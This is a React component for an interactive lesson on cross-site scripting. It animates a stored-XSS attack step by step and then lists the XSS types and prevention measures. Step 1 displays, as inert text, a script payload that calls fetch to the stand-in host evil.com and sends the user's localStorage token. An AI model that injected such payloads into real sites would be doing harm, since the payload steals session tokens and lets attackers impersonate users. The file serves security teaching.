import { motion } from "framer-motion"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/Card"
import { User, Globe, Key, AlertTriangle, Eye, Shield, CheckCircle } from "lucide-react"
import { useState } from "react"

export function XSSVisualizer() {
  const [step, setStep] = useState(0)

  const steps = [
    { label: "Vulnerable Page", description: "Comment section without sanitization" },
    { label: "Malicious Input", description: "Attacker posts JavaScript code" },
    { label: "Script Executes", description: "Code runs in victims' browsers" },
    { label: "Token Stolen", description: "Attacker captures localStorage data" },
  ]

  return (
    <div className="space-y-6">
      {/* Progress */}
      <div className="flex justify-center">
        <div className="flex items-center gap-2">
          {steps.map((_, i) => (
            <div key={i} className="flex items-center">
              <button
                onClick={() => { setStep(i); }}
                className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium transition-all ${
                  i === step
                    ? "bg-primary text-primary-foreground"
                    : i < step
                    ? "bg-success text-success-foreground"
                    : "bg-muted text-muted-foreground"
                }`}
              >
                {i < step ? <CheckCircle className="h-5 w-5" /> : i + 1}
              </button>
              {i < steps.length - 1 && (
                <div className={`w-8 h-1 mx-1 ${i < step ? "bg-success" : "bg-muted"}`} />
              )}
            </div>
          ))}
        </div>
      </div>

      <Card>
        <CardContent className="pt-6">
          <div className="min-h-[280px] flex items-center justify-center">
            {/* Step 0: Vulnerable page */}
            {step === 0 && (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="w-full max-w-lg"
              >
                <div className="text-center mb-4">
                  <Globe className="h-12 w-12 mx-auto text-primary mb-2" />
                  <h3 className="font-semibold">Vulnerable Comment Section</h3>
                </div>
                <div className="bg-muted rounded-lg p-4">
                  <div className="flex items-start gap-3 mb-4">
                    <User className="h-8 w-8 text-muted-foreground mt-1" />
                    <div className="flex-1">
                      <p className="font-medium text-sm">John Doe</p>
                      <p className="text-sm">Great article! Thanks for sharing.</p>
                    </div>
                  </div>
                  <div className="border-t pt-4">
                    <input
                      type="text"
                      placeholder="Add a comment..."
                      className="w-full p-2 rounded border bg-background text-sm"
                      disabled
                    />
                    <button className="mt-2 px-4 py-2 bg-primary text-primary-foreground rounded text-sm" disabled>
                      Post Comment
                    </button>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step 1: Malicious input */}
            {step === 1 && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full max-w-lg"
              >
                <div className="text-center mb-4">
                  <AlertTriangle className="h-12 w-12 mx-auto text-warning mb-2" />
                  <h3 className="font-semibold">Attacker Posts Comment</h3>
                </div>
                <div className="bg-muted rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <User className="h-8 w-8 text-destructive mt-1" />
                    <div className="flex-1">
                      <p className="font-medium text-sm text-destructive">Attacker</p>
                      <div className="bg-background p-2 rounded mt-1">
                        <code className="text-xs text-destructive block">
                          {"<script>"}
                          <br />
                          {"  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))"}
                          <br />
                          {"</script>"}
                        </code>
                      </div>
                    </div>
                  </div>
                </div>
                <p className="text-center text-sm text-muted-foreground mt-4">
                  The attacker submits malicious JavaScript as a comment
                </p>
              </motion.div>
            )}

            {/* Step 2: Script executes */}
            {step === 2 && (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="w-full max-w-lg"
              >
                <div className="text-center mb-4">
                  <AlertTriangle className="h-12 w-12 mx-auto text-destructive mb-2" />
                  <h3 className="font-semibold text-destructive">Script Executes!</h3>
                </div>
                <div className="bg-muted rounded-lg p-4">
                  <p className="text-sm mb-3">When other users view the page:</p>
                  <div className="bg-background rounded p-3">
                    <div className="flex items-center gap-2 mb-2">
                      <Key className="h-4 w-4 text-warning" />
                      <span className="text-sm">localStorage.getItem('token')</span>
                    </div>
                    <motion.div
                      className="h-2 bg-primary/30 rounded overflow-hidden"
                      animate={{ width: ["0%", "100%"] }}
                      transition={{ duration: 1 }}
                    />
                    <p className="text-xs text-muted-foreground mt-2">
                      Accessing tokens from browser storage...
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => setStep(3)}
                  className="mt-4 w-full py-2 bg-primary text-primary-foreground rounded-lg"
                >
                  Simulate Token Theft
                </button>
              </motion.div>
            )}

            {/* Step 3: Token stolen */}
            {step === 3 && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full max-w-lg text-center"
              >
                <Eye className="h-16 w-16 mx-auto text-destructive mb-4" />
                <h3 className="text-xl font-bold text-destructive mb-2">Token Stolen!</h3>
                <div className="bg-destructive/10 border border-destructive rounded-lg p-4 text-left mb-4">
                  <p className="text-sm font-medium mb-2">Attacker receives:</p>
                  <code className="text-xs block bg-background p-2 rounded">
                    GET https://evil.com/steal?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
                  </code>
                </div>
                <p className="text-muted-foreground">
                  The attacker now has the user's authentication token and can impersonate them.
                </p>
              </motion.div>
            )}
          </div>
        </CardContent>
      </Card>

      {/* XSS Types */}
      <Card>
        <CardHeader>
          <CardTitle className="text-lg">Types of XSS Attacks</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid md:grid-cols-3 gap-4">
            <div className="p-4 bg-muted rounded-lg">
              <h4 className="font-medium mb-2 text-primary">Stored XSS</h4>
              <p className="text-sm text-muted-foreground">
                Malicious script saved in database. Executes when users view the affected content.
              </p>
            </div>
            <div className="p-4 bg-muted rounded-lg">
              <h4 className="font-medium mb-2 text-warning">Reflected XSS</h4>
              <p className="text-sm text-muted-foreground">
                Script in URL parameters reflected back in the response. User must click malicious link.
              </p>
            </div>
            <div className="p-4 bg-muted rounded-lg">
              <h4 className="font-medium mb-2">DOM-based XSS</h4>
              <p className="text-sm text-muted-foreground">
                Script modifies DOM in the browser. No server involvement needed.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Prevention */}
      <div className="grid md:grid-cols-2 gap-4">
        <Card className="border-success/50">
          <CardContent className="pt-6">
            <Shield className="h-10 w-10 text-success mb-2" />
            <h4 className="font-medium mb-2">Prevention Methods</h4>
            <ul className="text-sm text-muted-foreground space-y-1">
              <li>• Sanitize all user input</li>
              <li>• Escape HTML output (use frameworks)</li>
              <li>• Use Content Security Policy (CSP)</li>
              <li>• Store tokens in HTTP-only cookies</li>
              <li>• Use React/Angular/Vue auto-escaping</li>
            </ul>
          </CardContent>
        </Card>
        <Card className="border-destructive/50">
          <CardContent className="pt-6">
            <AlertTriangle className="h-10 w-10 text-destructive mb-2" />
            <h4 className="font-medium mb-2">Never Do This</h4>
            <ul className="text-sm text-muted-foreground space-y-1">
              <li>• Never use innerHTML with user input</li>
              <li>• Never eval() user data</li>
              <li>• Don't insert raw HTML from comments</li>
              <li>• Don't trust client-side validation alone</li>
            </ul>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
